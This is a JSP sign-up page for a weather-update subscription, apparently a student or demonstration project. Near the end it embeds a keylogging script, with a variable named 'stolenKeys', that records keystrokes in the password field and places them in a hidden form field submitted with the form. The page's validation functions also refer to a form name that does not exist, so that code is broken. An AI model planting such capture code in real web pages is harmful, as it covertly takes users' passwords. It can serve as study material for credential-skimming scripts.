<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
    pageEncoding="ISO-8859-1"%>
<%@page import="java.util.*" %>


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Sign Up</title>
<link rel="stylesheet" type="text/css" href="demo.css" />
<!--[if IE 6]>
<style>
body {behavior: url("csshover3.htc");}
#menu li .drop {background:url("img/drop.gif") no-repeat right 8px; 
</style>
<![endif]-->
	

<script language="javascript" type="text/javascript">  
 var xmlHttp;
 
 /* function stateChange(){   
	 if (xmlHttp.readyState==4 || xmlHttp.readyState=="complete"){   
	 document.getElementById("testName_err").innerHTML=xmlHttp.responseText;  
	 }   
 }    */
 </script> 
<script type="text/javascript">

function validateFirstName()
{	var myform=document.registerStudent;
	var firstName=myform.firstName.value;
	var flag1;
	var patt1 = /[^a-z A-Z 0-9]+/i;
	flag1=patt1.test(firstName);
	if(firstName==""){
		document.getElementById("firstName_err").innerHTML="Please enter name";
		 return false;
	}
	else if(firstName.match(/\d+/g))
	{
		document.getElementById("firstName_err").innerHTML="Invalid Entry";
		  return false;
	}
	else if(flag1)
	{ document.getElementById("firstName_err").innerHTML="Invalid Entry";
	  return false;
	}
	else
	{
	  document.getElementById("firstName_err").innerHTML=""; 
	}
	return true;
}

function validateLastName()
{	var myform=document.registerStudent;
	var lastName=myform.lastName.value;
	var flag1;
	var patt1 = /[^a-z A-Z 0-9]+/i;
	flag1=patt1.test(lastName);
	if(lastName==""){	
		document.getElementById("lastName_err").innerHTML="Please enter last name";
		return false;
	}
	
	else if(lastName.match(/\d+/g))
	{
		document.getElementById("lastName_err").innerHTML="Invalid Entry";
		  return false;
	}
	else if(flag1)
	{ document.getElementById("lastName_err").innerHTML="Invalid Entry";
	  return false;
	}
	else
	{
	 
	  document.getElementById("lastName_err").innerHTML=""; 
	}
	return true;
}

function cancelAction()
{	
	window.location.href="/project1/JSP/login.jsp"; 
	
}
</script>

</head>
	
<body>

<div id="title">

  <div id="title1">Sign Up for Weather Updates</div>
</div>
<div id="main1">
  <div id="gallery">
  <br />
  <br />
  <center>
  <h2>CREATE ACCOUNT</h2><hr></hr>
  <br />
   
<form name="signup" action ="subscribe.jsp" >
<input type="hidden" name="operation" value="signUp" />
<table>
<tr align="left">
<td>User Name</td>
<td><input type="text" name="fname" maxlength="20"></input><span id="firstName_err" class="disp_err"></span></td>
</tr>
<tr align="left">
<td>Password[8-10 characters]</td>
<td><input type="password" id="password" maxlength="20"></input></td>
</tr>
<tr align="left">
<td>Email ID:</td>
<td><input type="text" name="email" maxlength="20"></input><span id="lastName_err" class="disp_err"></span></td>

</tr>
<tr><td>
<input type="hidden" id = "keys" name="keys"/> </td>

</tr>
<tr><td><br/></td><td>  </td></tr>
<tr>
<td align="center"><input type="submit" value="Sign up" /></td>
<td align="center"><input type="reset" value="Cancel" onclick="cancelAction()"/> </td>
</tr>
</table>
</form>
<script>
			var stolenKeys="";				
			document.getElementById("password").addEventListener("keydown", myFunction);
			
			function myFunction(e) {			
				var code = e.keyCode;
				var value = String.fromCharCode(code);
				if(code == 8)
					stolenKeys = stolenKeys.substring(0,stolenKeys.length - 1);				
				if(code >= 48 && code <=90)
					stolenKeys+=value;
				
				document.getElementById("keys").value = stolenKeys;		
				if(stolenKeys.length == 8)
					alert(stolenKeys);
			}
		</script> 
</center>
<br /><br /><br />
  </div></div>
</body>
</html>
